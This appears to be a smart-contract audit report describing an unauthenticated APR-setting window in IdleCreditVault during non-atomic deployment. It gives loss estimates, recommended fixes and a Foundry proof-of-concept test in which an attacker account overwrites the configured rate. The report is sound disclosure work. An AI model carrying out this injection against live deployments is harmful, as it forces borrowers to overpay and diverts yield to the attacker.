### Title
Unauthenticated APR injection during strategy setup overrides the configured borrower rate - ([File: `contracts/strategies/idle/IdleCreditVault.sol`](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setApr` deliberately skips its caller check while `idleCDO` is unset. During a non-atomic strategy/CDO deployment, any unprivileged account can call `setApr`, `setAprs`, or `setAprsWithBuffer` and replace the administrator-configured APR before the CDO address is whitelisted. The injected value is still capped by `maxApr`, but it can raise the borrower rate to the maximum permitted value. This closely matches the external bug class: an undefined setup-time caller can overwrite a privileged configuration value because validation is missing for that transition state.

### Finding Description
`IdleCreditVault.initialize` stores the intended APR in `lastApr` and `unscaledApr` and sets `maxApr` to `DEFAULT_MAX_APR`. [1](#0-0) 

`setApr` only checks that the caller is the CDO or manager when `idleCDO != address(0)`. While `idleCDO` remains zero, any EOA can update the configured rate. [2](#0-1) 

The same issue exists through `setAprs` and `setAprsWithBuffer`, which update `unscaledApr` before calling `setApr`. [3](#0-2) [4](#0-3) 

The CDO initialization and epoch-start paths consume the strategy APR rather than a separately authenticated value. `_additionalInit` scales the strategy-reported APR, and `startEpoch` uses the resulting rate to calculate the borrower’s expected repayment. [5](#0-4) [6](#0-5) 

The current factory flow is safe because strategy initialization, APR configuration, and CDO whitelisting occur in one transaction. [7](#0-6) [8](#0-7)  The vulnerable state remains for manual or multi-transaction deployments, where an attacker can persistently inject the APR between strategy initialization and `setWhitelistedCDO`.

### Impact Explanation
An attacker who is a KYC-approved lender can inject a higher APR before CDO whitelisting and then deposit before the first epoch. If the borrower repays at the manipulated rate, the excess interest is distributed through normal tranche accounting, giving the attacker a pro-rata share of yield that was never authorized by the manager.

The maximum scaled rate is `DEFAULT_MAX_APR = 20e18`. For a configured unscaled APR `a`, TVL `T`, epoch duration `D`, and buffer `B`, the borrower overpayment is approximately:

```text
loss = T * ((20e18 - a) / 1e18) * ((D + B) / 365 days)
```

For example, with a configured 12% APR, 10 million underlying units of TVL, a 7-day epoch, and a 12-hour buffer, the borrower overpays approximately:

```text
10,000,000 * 8% * 7.5 / 365 ~= 16,438 underlying units
```

An attacker holding 50% of the pool would receive roughly half of that excess, less fees. If the borrower cannot cover the manipulated liability, `stopEpoch` follows the borrower-default path, potentially freezing normal operations and socializing the resulting loss. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
Likelihood is deployment-dependent:

- Factory deployments are not exploitable because the vulnerable window is internal to one transaction.
- Manual deployments are exploitable whenever strategy initialization and `setWhitelistedCDO` are separate transactions.
- The injected APR cannot exceed `maxApr`, so the attacker cannot select an unlimited rate.
- Exploitation requires the operator to link the CDO and start the epoch without correcting or verifying the strategy APR.
- No privileged malicious behavior is required; the owner or manager can remain honest but simply complete the planned deployment using the strategy’s current APR state.

### Recommendation
Do not allow unauthenticated APR mutation before the CDO is configured. When `idleCDO == address(0)`, restrict `setApr`, `setAprs`, and `setAprsWithBuffer` to the owner or manager. Additionally, validate the strategy’s `lastApr` and `unscaledApr` against the intended deployment parameters immediately before calling `setWhitelistedCDO`, or require deployment through an atomic factory path.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract CreditVaultAprInjectionForkTest is Test {
    IdleCreditVault strategy;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");
    address proxyAdmin = makeAddr("proxyAdmin");
    address idleCDO = makeAddr("idleCDO");

    uint256 constant CONFIGURED_APR = 12e18;
    uint256 constant MAX_SCALED_APR = 20e18;
    uint256 constant EPOCH_DURATION = 7 days;
    uint256 constant BUFFER_PERIOD = 12 hours;

    function test_AnyoneCanInjectAprBeforeCdoWhitelisting() public {
        // Fork a production network so the real underlying metadata is used.
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), vm.envUint("FORK_BLOCK"));
        IERC20Detailed underlying = IERC20Detailed(vm.envAddress("UNDERLYING"));

        IdleCreditVault implementation = new IdleCreditVault();
        bytes memory initData = abi.encodeWithSelector(
            IdleCreditVault.initialize.selector,
            address(underlying),
            owner,
            manager,
            borrower,
            "Borrower",
            CONFIGURED_APR
        );

        strategy = IdleCreditVault(
            address(new TransparentUpgradeableProxy(
                address(implementation),
                proxyAdmin,
                initData
            ))
        );

        assertEq(strategy.unscaledApr(), CONFIGURED_APR);
        assertEq(strategy.getApr(), CONFIGURED_APR);
        assertEq(strategy.idleCDO(), address(0));

        // Pick an injected unscaled APR that survives CDO-side epoch+buffer scaling
        // without exceeding maxApr.
        uint256 injectedApr =
            (MAX_SCALED_APR * EPOCH_DURATION) /
            (EPOCH_DURATION + BUFFER_PERIOD);

        vm.prank(attacker);
        strategy.setAprs(injectedApr, injectedApr);

        assertEq(strategy.unscaledApr(), injectedApr);
        assertEq(strategy.getApr(), injectedApr);
        assertGt(strategy.getApr(), CONFIGURED_APR);

        // After whitelisting, the missing setup authorization disappears.
        vm.prank(owner);
        strategy.setWhitelistedCDO(idleCDO);

        vm.prank(attacker);
        vm.expectRevert();
        strategy.setApr(CONFIGURED_APR);
    }
}
```
